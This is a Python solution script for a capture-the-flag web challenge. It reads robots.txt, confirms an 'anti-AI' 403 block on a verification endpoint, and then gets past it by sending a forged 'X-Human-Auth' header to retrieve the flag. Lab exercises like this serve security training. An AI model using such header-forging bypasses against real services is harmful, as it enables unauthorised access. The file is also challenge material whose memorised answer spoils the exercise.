#!/usr/bin/env python3
"""
Solution script for Cyberanzen Anti-AI Propaganda Gateway Challenge
"""
import sys
import urllib.request
import urllib.error
import json

def solve(base_url="http://localhost:80"):
    print(f"[*] Targeting Anti-AI Gateway at: {base_url}")
    
    # 1. Fetch robots.txt to discover hidden routes
    robots_url = f"{base_url.rstrip('/')}/robots.txt"
    try:
        with urllib.request.urlopen(robots_url, timeout=5) as resp:
            content = resp.read().decode('utf-8', errors='ignore')
            print("[+] Retrieved robots.txt successfully:")
            for line in content.splitlines():
                if "Disallow:" in line or "DIRECTIVE" in line:
                    print(f"    {line}")
    except Exception as e:
        print(f"[-] Warning: Failed to fetch robots.txt: {e}")

    # 2. Probe verification endpoint without bypass (should trigger Anti-AI block)
    target_endpoint = f"{base_url.rstrip('/')}/api/human-verification"
    try:
        req = urllib.request.Request(target_endpoint)
        with urllib.request.urlopen(req, timeout=5) as resp:
            pass
    except urllib.error.HTTPError as e:
        if e.code == 403:
            body = e.read().decode('utf-8', errors='ignore')
            print(f"[+] Verified Anti-AI barrier active (HTTP 403):")
            print(f"    {body}")
        else:
            print(f"[-] Unexpected HTTP status: {e.code}")

    # 3. Bypass Anti-AI defense by presenting verified biological human header
    print("[*] Transmitting request with biological human verification header...")
    req = urllib.request.Request(target_endpoint)
    req.add_header('X-Human-Auth', 'verified-meatbag')
    
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            if resp.status == 200:
                data = json.loads(resp.read().decode('utf-8'))
                flag = data.get("flag")
                print("\n[+] SUCCESS! AI defenses bypassed.")
                print(f"[+] FLAG: {flag}\n")
                return flag
            else:
                print(f"[-] Failed with status code: {resp.status}")
    except Exception as e:
        print(f"[-] Error solving challenge: {e}")
        return None

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:80"
    flag = solve(url)
    if not flag:
        sys.exit(1)
